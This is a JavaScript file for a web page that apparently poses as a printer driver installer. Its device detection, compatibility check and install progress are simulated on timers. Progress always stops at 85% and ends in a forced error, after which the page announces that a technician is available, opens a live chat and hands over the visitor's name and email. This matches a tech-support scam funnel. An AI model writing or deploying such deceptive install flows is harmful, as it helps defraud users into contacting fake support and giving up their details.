// =============================
// STEP NAVIGATION
// =============================

$(document).on("click", ".step-btn", function () {
  $(".step").hide();
  $("#step2").fadeIn();
});

$(document).on("click", ".step2-btn", function () {
  $(".step").hide();
  $("#step3").fadeIn();
  simulateDetection();
});

// =============================
// STEP 3 → DETECT DEVICE
// =============================
function simulateDetection() {
  let messages = [
    "Scanning for connected devices...",
    "Detecting printer...",
    "Establishing secure connection..."
  ];

  let i = 0;

  let interval = setInterval(() => {
    $("#statusText").text(messages[i]);
    i++;

    if (i >= messages.length) {
      clearInterval(interval);

      setTimeout(() => {
        $(".step").hide();
        $("#step4").fadeIn();
        simulateCompatibility();
      }, 800);
    }
  }, 1200);
}

// =============================
// STEP 4 → COMPATIBILITY
// =============================
function simulateCompatibility() {
  setTimeout(() => {
    $(".step").hide();
    $("#step5").fadeIn();
    runInstall();
  }, 2000);
}

// =============================
// STEP 5 → INSTALL (FIXED)
// =============================
function runInstall() {

  let progressBar = document.getElementById("progressBar");
  let progress = 0;

  let interval = setInterval(() => {
    progress += Math.random() * 12;

    if (progress > 85) progress = 85;

    progressBar.style.width = progress + "%";

    // ✅ FIX: correct ID
    $("#installStatusText").text(
      "Installing drivers... " + Math.floor(progress) + "%"
    );

    if (progress >= 85) {
      clearInterval(interval);

      setTimeout(() => {
        $("#installErrorBox").fadeIn();
      }, 1000);
    }

  }, 700);
}

// =============================
// DRIVER CHECK
// =============================
$(document).on("click", "#checkDriversBtn", function () {
  $(".step").hide();
  $("#step6").fadeIn();
  simulateDriverCheck();
});

function simulateDriverCheck() {
  let messages = [
    "Analyzing system configuration...",
    "Checking driver compatibility...",
    "Detecting missing dependencies...",
    "Attempting auto-repair..."
  ];

  let i = 0;

  let interval = setInterval(() => {
    $("#step6Text").text(messages[i]); // ✅ FIXED ID
    i++;

    if (i >= messages.length) {
      clearInterval(interval);

      setTimeout(() => {
        showFinalError(); // 🔥 use centralized function
      }, 1200);
    }

  }, 1200);
}

// =============================
// RESET
// =============================
$(document).on("click", ".downloadBtn, .btn-close", function () {
  $(".step").hide();
  $("#step1").show();

  $("#progressBar").css("width", "0%");
  $("#installErrorBox").hide();
  $("#installStatusText").text("Initializing...");
});


// =============================
// SUPPORT FORM SUBMIT
// =============================

$(document).on("submit", "#supportForm", function (e) {
  e.preventDefault();

  let formData = $(this).serialize();

  $.ajax({
    url: "send_mail.php",
    type: "POST",
    data: formData,
    success: function (response) {
      $("#supportForm").hide();
      $("#formSuccessMsg").fadeIn();
    },
    error: function () {
      alert("Something went wrong. Please try again.");
    }
  });
});


// inside runs/script.js
function showFinalError() {
  $(".step").hide();
  $("#step8").fadeIn();

  // 🔥 human-like transition
  setTimeout(() => {
    $("#supportMsg").text("A technician is available. Opening chat...");
  }, 1200);

  // 🔥 open chat
  setTimeout(() => {
    if (window.parent && window.parent.Tawk_API) {
      window.parent.Tawk_API.maximize();

      // OPTIONAL: pass user data if already filled
      let name = $("#name").val();
      let email = $("#email").val();

      if (name || email) {
        window.parent.Tawk_API.setAttributes({
          name: name || "Guest User",
          email: email || "not_provided@example.com"
        }, function(error){});
      }
    }
  }, 1800);
}